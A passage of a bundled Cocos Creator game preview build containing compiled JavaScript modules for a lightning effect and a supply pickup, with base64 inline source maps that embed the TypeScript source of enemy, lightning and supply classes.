WxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICBibG9vZE5vZGUuYWN0aXZlID1mYWxzZTtcclxuICAgICAgICB9KSkpO1xyXG4gICAgfVxyXG5cclxuICAgIGlzSW5BdHRhY2tSYW5nZSgpOmJvb2xlYW57XHJcbiAgICAgICAgbGV0IHN1YiA9IHdpbmRvd1snR2FtZVJvbGVDb250cm9sbGVyJ10ucm9sZS5ub2RlLnBvc2l0aW9uLnN1Yih0aGlzLm5vZGUucG9zaXRpb24pO1xyXG4gICAgICAgIGxldCBkaXN0YW5jZSA9IHN1Yi5tYWcoKTtcclxuICAgICAgICAvL+W5tuS4lOaJk+S4jeWIsOaVjOS6ulxyXG5cclxuICAgICAgICBpZiAoZGlzdGFuY2UgPCB0aGlzLmF0dGFja0Rpc3RhbmNlICsgd2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzKXtcclxuICAgICAgICAgICAgLy8gY29uc29sZS5sb2coXCI9PT09PT09PT09PT09PT0+5oCq54mp5Y+v5Lul5pS75Ye75LqGXCIpO1xyXG4gICAgICAgICAgICAvKiog5qC55o2u5pS75Ye76Led56a76K6h566X5pS75Ye75aS56KeSICovXHJcbiAgICAgICAgICAgIGxldCBhdHRhY2tSYWRpYW4gPSBNYXRoLmF0YW4od2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzL2Rpc3RhbmNlKTtcclxuICAgICAgICAgICAgaWYgKHN1Yi5hbmdsZShjYy52MigwLCAxKS5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC10aGlzLm5vZGUucm90YXRpb24pKSkgPCBhdHRhY2tSYWRpYW4pe1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xyXG4gICAgfVxyXG5cclxuICAgIHByb3RlY3RlZCBkb0F0dGFjaygpe1xyXG4gICAgICAgIC8qKiDliKTmlq3mlLvlh7vop5LluqbkuI7ot53nprvvvIzlnKjkuIDlrprojIPlm7TlhoXliJnliKTmlq3kuLrmlLvlh7vmiJDlip8gKi9cclxuICAgICAgICBpZiAodGhpcy5pc0luQXR0YWNrUmFuZ2UoKSl7XHJcbiAgICAgICAgICAgIE11c2ljLnBsYXlTRlgoXCJzb3VuZC9tc2NfZW4wMDNcIik7XHJcbiAgICAgICAgICAgIHdpbmRvd1snR2FtZVJvbGVDb250cm9sbGVyJ10uaHAgLT0gdGhpcy5odXJ0O1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBwcm90ZWN0ZWQgX2VuZW15SUQgPSAwO1xyXG5cclxuXHJcbiAgICBnZXQgZW5lbXlJRCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9lbmVteUlEO1xyXG4gICAgfVxyXG5cclxuICAgIGluaXQoaWQ6bnVtYmVyKXtcclxuICAgICAgICB0aGlzLl9lbmVteUlEID0gaWQ7XHJcbiAgICAgICAgbGV0IGNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLkVuZW15KVtpZC0xXTtcclxuICAgICAgICB0aGlzLnVucmVwZWwgPSBjb25maWdbJ3VucmVwZWwnXTtcclxuICAgICAgICB0aGlzLl9tb3ZlU3BlZWQgPSBjb25maWdbJ21vdmUnXTtcclxuICAgICAgICB0aGlzLmFjY1NwZWVkID0gY29uZmlnWydhY2NfcyddO1xyXG4gICAgICAgIHRoaXMuZm91bmRSYW5nZSA9IGNvbmZpZ1snZm91bmRfcmcnXTtcclxuICAgICAgICB0aGlzLmFnaWxpdHkgPSBjb25maWdbJ2FnaWxpdHknXTtcclxuICAgICAgICB0aGlzLmF0dGFja0Rpc3RhbmNlID0gY29uZmlnWydyYW5nZSddO1xyXG4gICAgICAgIHRoaXMuYXR0YWNrQ0QgPSBjb25maWdbJ2ZyZSddO1xyXG4gICAgICAgIHRoaXMuYnVsbGV0U3BlZWQgPSBjb25maWdbJ3NwZWVkJ107XHJcbiAgICAgICAgdGhpcy5tYXhIcCA9IHRoaXMuX2hwID0gTWF0aC5mbG9vcihjb25maWdbJ2hlYWx0aCddKkdhbWVQcm94eS5lbmVteUhwTXVsT2YodGhpcy5fZW5lbXlJRCkpO1xyXG4gICAgICAgIHRoaXMuaHVydCA9IE1hdGguZmxvb3IoY29uZmlnWydodXJ0J10gKiBHYW1lUHJveHkuZW5lbXlIdXJ0TXVsT2YoY29uZmlnWydpZCddKSk7XHJcbiAgICAgICAgdGhpcy5oaWVyYXJjaHkgPSBjb25maWdbJ2hpZXJhcmNoeSddO1xyXG4gICAgICAgIHRoaXMuaHVtb3JTY2FsZSA9IGNvbmZpZ1snaHVtb3InXTtcclxuICAgICAgICB0aGlzLmdvbGQgPSBNYXRoLmZsb29yKGNvbmZpZ1snZ29sZF9wcm8nXSAqIEdhbWVQcm94eS5lbmVteUdvbGRNdWxPZih0aGlzLl9lbmVteUlEKSk7XHJcbiAgICAgICAgdGhpcy5nb2xkSWNvbkZlbGwgPSBjb25maWdbJ2dvbGRfZmVsbCddO1xyXG4gICAgICAgIHRoaXMuc3BlZWRjdXQgPSBjb25maWdbJ3NwZWVkY3V0J107XHJcbiAgICAgICAgdGhpcy5ub2RlLnpJbmRleCA9IHRoaXMuaGllcmFyY2h5O1xyXG4gICAgICAgIHRoaXMuYXR0YWNrRGVsYXlUaW1lID0gQXR0YWNrRGVsYXlMaXN0W2lkLTFdO1xyXG4gICAgICAgIGlmIChpZCA+IEF0dGFja0RlbGF5TGlzdC5sZW5ndGgpe1xyXG4gICAgICAgICAgICBjb25zb2xlLmVycm9yKFwiX2VuZW15SUQgPiBBdHRhY2tEZWxheUxpc3QubGVuZ3RoXCIpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBwcm90ZWN0ZWQgc2V0QW5pbWF0aW9uKHRyYWNrSW5kZXg6bnVtYmVyLCBuYW1lOnN0cmluZywgbG9vcDpib29sZWFuKXtcclxuICAgICAgICB0aGlzLnNrZS5zZXRBbmltYXRpb24odHJhY2tJbmRleCwgbmFtZSwgbG9vcCk7XHJcbiAgICAgICAgdGhpcy5tb3ZlRmxhZyA9ICBuYW1lID09IFwid2Fsa1wiO1xyXG4gICAgICAgIHRoaXMubG9va0F0Um9sZUZsYWcgPSBuYW1lICE9IFwic3RyaWtlXCI7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBhdHRhY2tEZWxheVRpbWUgPSAtMTtcclxuXHJcbiAgICBzdG9wQXR0YWNrKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBY3Rpb25CeVRhZygxMTk5KTtcclxuICAgIH1cclxuXHJcbiAgICBwbGF5U3RhbmQoKXtcclxuICAgICAgICB0aGlzLnNldEFuaW1hdGlvbigwLCBcInN0YW5kXCIsIHRydWUpO1xyXG4gICAgfVxyXG5cclxuICAgIHBsYXlBdHRhY2soKXtcclxuICAgICAgICBpZiAodGhpcy5hdHRhY2tEZWxheVRpbWUgPj0gMCl7XHJcbiAgICAgICAgICAgIGxldCBhY3Rpb24gPSBjYy5zcGVlZChjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUodGhpcy5hdHRhY2tEZWxheVRpbWUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgaWYgKCFHYW1lUHJveHkucGF1c2VHYW1lKXtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLmRvQXR0YWNrKCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pKSwgMSk7XHJcbiAgICAgICAgICAgIGFjdGlvbi5zZXRUYWcoMTE5OSk7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5zZXRBbmltYXRpb24oMCwgXCJzdHJpa2VcIiwgZmFsc2UpO1xyXG4gICAgfVxyXG5cclxuICAgIHBsYXlXYWxrKCl7XHJcbiAgICAgICAgdGhpcy5zZXRBbmltYXRpb24oMCwgXCJ3YWxrXCIsIHRydWUpO1xyXG4gICAgfVxyXG5cclxuICAgIHBsYXlEZWFkKCl7XHJcbiAgICAgICAgdGhpcy5zdG9wQXR0YWNrKCk7XHJcbiAgICAgICAgdGhpcy5za2UudGltZVNjYWxlID0gQkFTRV9USU1FX1NDQUxFO1xyXG4gICAgICAgIHRoaXMuc2V0QW5pbWF0aW9uKDAsIFwiZGVhZFwiLCBmYWxzZSk7XHJcbiAgICB9XHJcblxyXG4gICAgcGxheUJlYXRlbigpe1xyXG4gICAgICAgIHRoaXMuc3RvcEF0dGFjaygpO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwiYmVhdGVuMi4uLi4uXCIpO1xyXG4gICAgICAgIHRoaXMuc2V0QW5pbWF0aW9uKDAsIFwiYmVhdGVuMlwiLCBmYWxzZSk7XHJcbiAgICB9XHJcblxyXG4gICAgcGxheUJlYXRlbkJhY2soKXtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcImJlYXRlbi4uLi4uXCIpO1xyXG4gICAgICAgIHRoaXMuc2V0QW5pbWF0aW9uKDAsIFwiYmVhdGVuXCIsIGZhbHNlKTtcclxuICAgIH1cclxuXHJcbiAgICBpc0F0dGFja2luZygpe1xyXG4gICAgICAgIHJldHVybiB0aGlzLnNrZS5hbmltYXRpb24gPT0gXCJzdHJpa2VcIjtcclxuICAgIH1cclxuXHJcbiAgICBpc0JlYXRpbmcoKXtcclxuICAgICAgICByZXR1cm4gdGhpcy5za2UuYW5pbWF0aW9uID09IFwiYmVhdGVuMlwiIHx8IHRoaXMuc2tlLmFuaW1hdGlvbiA9PSBcImJlYXRlblwiO1xyXG4gICAgfVxyXG5cclxuICAgIGlzV2Fsa2luZygpe1xyXG4gICAgICAgIHJldHVybiB0aGlzLnNrZS5hbmltYXRpb24gPT0gXCJ3YWxrXCI7XHJcbiAgICB9XHJcblxyXG4gICAgaXNTdGFuZGluZygpe1xyXG4gICAgICAgIHJldHVybiB0aGlzLnNrZS5hbmltYXRpb24gPT0gXCJzdGFuZFwiO1xyXG4gICAgfVxyXG5cclxuICAgIGlzRGVhZCgpe1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9ocCA8PTA7XHJcbiAgICB9XHJcblxyXG4gICAgdHVyblRvKGRpcjpjYy5WZWMyKXtcclxuICAgICAgICBsZXQgZGVncmVlID0gKDkwIC0gY2MubWlzYy5yYWRpYW5zVG9EZWdyZWVzKE1hdGguYXRhbjIoZGlyLnksIGRpci54KSkpJTM2MDtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcImRlPT09PlwiLCBkZWdyZWUpO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwiZGlyPT09Png9XCIrZGlyLngrXCIgeT1cIitkaXIueSk7XHJcbiAgICAgICAgaWYgKGRlZ3JlZSA8IDApe1xyXG4gICAgICAgICAgICBkZWdyZWUgKz0gMzYwO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgZW5lbXlSb3RhdGlvbiA9IHRoaXMubm9kZS5yb3RhdGlvbiUzNjA7XHJcbiAgICAgICAgaWYgKGVuZW15Um90YXRpb24gPCAwKXtcclxuICAgICAgICAgICAgZW5lbXlSb3RhdGlvbiArPSAzNjA7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCBzdWJEZWdyZWUgPSBNYXRoLmFicyhkZWdyZWUgLSBlbmVteVJvdGF0aW9uKTtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcImRlZ3JlZT1cIitkZWdyZWUpO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwiZW5lbXlSb3RhdGlvbj09PT0+XCIrZW5lbXlSb3RhdGlvbik7XHJcbiAgICAgICAgbGV0IHNwZWVkID0gdGhpcy5fbW92ZVNwZWVkKnRoaXMuYWdpbGl0eSoodGhpcy5fYkFjYz8wLjU6MSkgKiB0aGlzLl9zcGVlZEFkZCAqICh0aGlzLl9nYW1lU2xvdz8wLjI6MSk7XHJcbiAgICAgICAgaWYgKHN1YkRlZ3JlZSA+IDApe1xyXG4gICAgICAgICAgICBsZXQgcm90YXRpb24gPSAwO1xyXG4gICAgICAgICAgICBpZiAoc3ViRGVncmVlID4gMTgwKXtcclxuICAgICAgICAgICAgICAgIHJvdGF0aW9uID0gTWF0aC5zaWduKGVuZW15Um90YXRpb24gLSBkZWdyZWUpICogc3BlZWQ7XHJcbiAgICAgICAgICAgICAgICBpZiAoTWF0aC5hYnMocm90YXRpb24pID4gMzYwIC0gc3ViRGVncmVlKXtcclxuICAgICAgICAgICAgICAgICAgICByb3RhdGlvbiA9IE1hdGguc2lnbihyb3RhdGlvbikqKDM2MC1zdWJEZWdyZWUpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICByb3RhdGlvbiA9IE1hdGguc2lnbihkZWdyZWUgLSBlbmVteVJvdGF0aW9uKSAqIHNwZWVkO1xyXG4gICAgICAgICAgICAgICAgaWYgKE1hdGguYWJzKHJvdGF0aW9uKSA+IHN1YkRlZ3JlZSl7XHJcbiAgICAgICAgICAgICAgICAgICAgcm90YXRpb24gPSBNYXRoLnNpZ24ocm90YXRpb24pICogc3ViRGVncmVlO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGVuZW15Um90YXRpb24gKz0gcm90YXRpb247XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMubm9kZS5yb3RhdGlvbiA9IGVuZW15Um90YXRpb247XHJcbiAgICB9XHJcblxyXG4gICAgbW92ZSgpe1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwibGVuPT09PlwiLCBsZW4pO1xyXG4gICAgICAgIGxldCBsZW4gPSB0aGlzLm1vdmVTcGVlZDtcclxuICAgICAgICBpZiAobGVuIDw9IDApcmV0dXJuIGZhbHNlO1xyXG4gICAgICAgIC8qKiDmsr/nnYDlvZPliY3mlrnlkJHnp7vliqggKi9cclxuICAgICAgICBsZXQgcG9zaXRpb24gPSB0aGlzLm5vZGUucG9zaXRpb24uYWRkKHRoaXMubW92ZURpci5tdWwobGVuKSk7XHJcbiAgICAgICAgLyoqIOWIpOaWreS4juinkuiJsueahOeisOaSniAqL1xyXG4gICAgICAgIC8vIGxldCB0b1JvbGVEaXN0YW5jZSA9IHBvc2l0aW9uLnN1Yih3aW5kb3dbJ0dhbWVSb2xlQ29udHJvbGxlciddLnJvbGUubm9kZS5wb3NpdGlvbikubWFnKCk7XHJcbiAgICAgICAgLy8gaWYgKHRvUm9sZURpc3RhbmNlIDwgdGhpcy5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyArIHdpbmRvd1snR2FtZVJvbGVDb250cm9sbGVyJ10ucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyl7XHJcbiAgICAgICAgLy8gICAgIHJldHVybiBmYWxzZTtcclxuICAgICAgICAvLyB9XHJcblxyXG4gICAgICAgIC8qKiDliKTmlq3ovrnnlYwgKi9cclxuICAgICAgICBpZiAocG9zaXRpb24ueCA+IHRoaXMuX2JvdW5kcy54TWF4IHx8IHBvc2l0aW9uLnggPCB0aGlzLl9ib3VuZHMueE1pbiB8fCBwb3NpdGlvbi55ID4gdGhpcy5fYm91bmRzLnlNYXggfHwgcG9zaXRpb24ueSA8IHRoaXMuX2JvdW5kcy55TWluKXtcclxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKCF0aGlzLl9iQWNjICYmIHRoaXMuZm91bmRSYW5nZSA+IDApe1xyXG4gICAgICAgICAgICBsZXQgdG9Sb2xlRGlzdGFuY2UgPSBwb3NpdGlvbi5zdWIod2luZG93WydHYW1lUm9sZUNvbnRyb2xsZXInXS5yb2xlLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICB0aGlzLmJBY2MgPSB0b1JvbGVEaXN0YW5jZSAtIGxlbiA8IHRoaXMuZm91bmRSYW5nZTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIC8qKiDliKTmlq3mgKrniankuYvpl7TnmoTnorDmkp4gKi9cclxuICAgICAgICAvLyBsZXQgYXJyID0gW107XHJcbiAgICAgICAgLy8gdGhpcy5fZ2FtZUNvbGxpc2lvbkNvbnRyb2xsZXIubG9vc2VRdWFkVHJlZS5yZXRyaWV2ZSh0aGlzLmVuZW15QUFCQi5hYWJiKCksYXJyKTtcclxuICAgICAgICAvL1xyXG4gICAgICAgIC8vIGZvciAobGV0IGFhYmJSZWdpb24gb2YgYXJyKXtcclxuICAgICAgICAvLyAgICAgbGV0IGVuZW15ID0gYWFiYlJlZ2lvbi5lbmVteTtcclxuICAgICAgICAvLyAgICAgaWYgKGVuZW15ICE9PSB0aGlzICYmIGVuZW15Lm5vZGUucG9zaXRpb24uc3ViKHBvc2l0aW9uKS5tYWcoKSA8IGVuZW15LnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzICsgZW5lbXkuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXMpe1xyXG4gICAgICAgIC8vICAgICAgICAgcmV0dXJuIGZhbHNlO1xyXG4gICAgICAgIC8vICAgICB9XHJcbiAgICAgICAgLy8gfVxyXG5cclxuICAgICAgICB0aGlzLm5vZGUucG9zaXRpb24gPSBwb3NpdGlvbjtcclxuICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGUoZHQ6bnVtYmVyKXtcclxuICAgICAgICBpZiAoR2FtZVByb3h5LnBhdXNlR2FtZSB8fCB0aGlzLnN0aWZmKXtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICAvKiog6YC76L6R5aSE55CG5qCH5b+XLS3kvJjljJbnrZbnlaXkuLrmr4/kuIDluKflj6rlpITnkIblm7rlrprmlbDph4/nmoTmgKrnianpgLvovpEgKi9cclxuICAgICAgICBpZiAodGhpcy5sb2dpY0ZsYWcpe1xyXG4gICAgICAgICAgICAvKiog5piv5ZCm5Y+v5Lul5pS75Ye7ICovXHJcbiAgICAgICAgICAgIGlmICgodGhpcy5pc1dhbGtpbmcoKSB8fCB0aGlzLmlzU3RhbmRpbmcoKSkgJiYgdGhpcy5pc0luQXR0YWNrUmFuZ2UoKSl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnBsYXlBdHRhY2soKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgLyoqIOaXi+i9rCAqL1xyXG4gICAgICAgICAgICBpZiAodGhpcy5sb29rQXRSb2xlRmxhZyl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnR1cm5Ubyh3aW5kb3dbJ0dhbWVSb2xlQ29udHJvbGxlciddLnJvbGUubm9kZS5wb3NpdGlvbi5zdWIodGhpcy5ub2RlLnBvc2l0aW9uKS5ub3JtYWxpemUoKSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgLyoqIOenu+WKqCAqL1xyXG4gICAgICAgIGlmICh0aGlzLm1vdmVGbGFnKXtcclxuICAgICAgICAgICAgdGhpcy5tb3ZlKCk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/prop/Lightning.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b12ccGunt9H9pBPDrPhutA1', 'Lightning');
// script/app/entities/prop/Lightning.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Lightning = /** @class */ (function (_super) {
    __extends(Lightning, _super);
    function Lightning() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        /** 默认高度375 */
        _this.ske = null;
        _this.lightEnemys = [];
        return _this;
    }
    Lightning.prototype.onLoad = function () {
        var _this = this;
        this.ske.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            _this.node.active = false;
            /** 生成一个新的 */
            if (_this.lightEnemys.length < 6) {
            }
        });
    };
    Lightning.prototype.joint = function (enemy) {
        this.lightEnemys.push(enemy);
        var sub = enemy.node.position.sub(this.node.position);
        var distance = sub.mag();
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(sub.y, sub.x));
        this.node.scaleY = distance / 375;
        this.node.active = true;
        this.ske.setAnimation(0, "animation", false);
    };
    __decorate([
        property(sp.Skeleton)
    ], Lightning.prototype, "ske", void 0);
    Lightning = __decorate([
        ccclass
    ], Lightning);
    return Lightning;
}(cc.Component));
exports.default = Lightning;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3Byb3AvTGlnaHRuaW5nLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFJTSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUF1Qyw2QkFBWTtJQUFuRDtRQUFBLHFFQTRCQztRQTFCRyxjQUFjO1FBRWQsU0FBRyxHQUFlLElBQUksQ0FBQztRQUVmLGlCQUFXLEdBQWdCLEVBQUUsQ0FBQzs7SUFzQjFDLENBQUM7SUFwQmEsMEJBQU0sR0FBaEI7UUFBQSxpQkFTQztRQVJHLElBQUksQ0FBQyxHQUFHLENBQUMsbUJBQW1CLENBQUMsVUFBQyxVQUFVLEVBQUUsU0FBUztZQUMvQyxJQUFJLElBQUksR0FBRyxVQUFVLENBQUMsU0FBUyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDO1lBQ2pFLEtBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztZQUN6QixhQUFhO1lBQ2IsSUFBSSxLQUFJLENBQUMsV0FBVyxDQUFDLE1BQU0sR0FBRyxDQUFDLEVBQUM7YUFFL0I7UUFDTCxDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7SUFFRCx5QkFBSyxHQUFMLFVBQU0sS0FBVztRQUNiLElBQUksQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDO1FBQzdCLElBQUksR0FBRyxHQUFHLEtBQUssQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ3RELElBQUksUUFBUSxHQUFHLEdBQUcsQ0FBQyxHQUFHLEVBQUUsQ0FBQztRQUN6QixJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxFQUFFLEdBQUcsRUFBRSxDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxJQUFJLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxDQUFDLEVBQUUsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDN0UsSUFBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsUUFBUSxHQUFDLEdBQUcsQ0FBQztRQUNoQyxJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDeEIsSUFBSSxDQUFDLEdBQUcsQ0FBQyxZQUFZLENBQUMsQ0FBQyxFQUFFLFdBQVcsRUFBRSxLQUFLLENBQUMsQ0FBQztJQUNqRCxDQUFDO0lBdkJEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7MENBQ0M7SUFKTixTQUFTO1FBRDdCLE9BQU87T0FDYSxTQUFTLENBNEI3QjtJQUFELGdCQUFDO0NBNUJELEFBNEJDLENBNUJzQyxFQUFFLENBQUMsU0FBUyxHQTRCbEQ7a0JBNUJvQixTQUFTIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcblxyXG5pbXBvcnQgRW5lbXkgZnJvbSBcIi4uL2VuZW15L0VuZW15XCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIExpZ2h0bmluZyBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgLyoqIOm7mOiupOmrmOW6pjM3NSAqL1xyXG4gICAgQHByb3BlcnR5KHNwLlNrZWxldG9uKVxyXG4gICAgc2tlOnNwLlNrZWxldG9uID0gbnVsbDtcclxuXHJcbiAgICBwcml2YXRlIGxpZ2h0RW5lbXlzOkFycmF5PEVuZW15PiA9IFtdO1xyXG5cclxuICAgIHByb3RlY3RlZCBvbkxvYWQoKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigodHJhY2tFbnRyeSwgbG9vcENvdW50KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgLyoqIOeUn+aIkOS4gOS4quaWsOeahCAqL1xyXG4gICAgICAgICAgICBpZiAodGhpcy5saWdodEVuZW15cy5sZW5ndGggPCA2KXtcclxuXHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBqb2ludChlbmVteTpFbmVteSl7XHJcbiAgICAgICAgdGhpcy5saWdodEVuZW15cy5wdXNoKGVuZW15KTtcclxuICAgICAgICBsZXQgc3ViID0gZW5lbXkubm9kZS5wb3NpdGlvbi5zdWIodGhpcy5ub2RlLnBvc2l0aW9uKTtcclxuICAgICAgICBsZXQgZGlzdGFuY2UgPSBzdWIubWFnKCk7XHJcbiAgICAgICAgdGhpcy5ub2RlLnJvdGF0aW9uID0gOTAgLSBjYy5taXNjLnJhZGlhbnNUb0RlZ3JlZXMoTWF0aC5hdGFuMihzdWIueSwgc3ViLngpKTtcclxuICAgICAgICB0aGlzLm5vZGUuc2NhbGVZID0gZGlzdGFuY2UvMzc1O1xyXG4gICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIHRoaXMuc2tlLnNldEFuaW1hdGlvbigwLCBcImFuaW1hdGlvblwiLCBmYWxzZSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/role/RoleSupply.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '2bd6dTM6NBDwZWsxGIeQ2I/', 'RoleSupply');
// script/app/entities/role/RoleSupply.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var RoleSupply = /** @class */ (function (_super) {
    __extends(RoleSupply, _super);
    function RoleSupply() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.ske = null;
        _this.roleNode = null;
        return _this;
    }
    RoleSupply.prototype.onLoad = function () {
        var _this = this;
        this.ske.setCompleteListener(function () {
            _this.node.destroy();
        });
    };
    RoleSupply.prototype.setSupply = function (id, roleNode) {
        this.roleNode = roleNode;
        this.roleNode.on(cc.Node.EventType.POSITION_CHANGED, this.onFollowRole, this);
        var skinName = "prop_" + ("0000000000" + id).substr(-3);
        this.ske.setSkin(skinName);
        this.ske.setAnimation(0, "supplyLong", false);
    };
    RoleSupply.prototype.onFollowRole = function () {
        this.node.position = this.roleNode.position;
    };
    RoleSupply.prototype.onDestroy = function () {
        if (this.roleNode) {
            this.roleNode.off(cc.Node.EventType.POSITION_CHANGED, this.onFollowRole, this);
        }
    };
    __decorate([
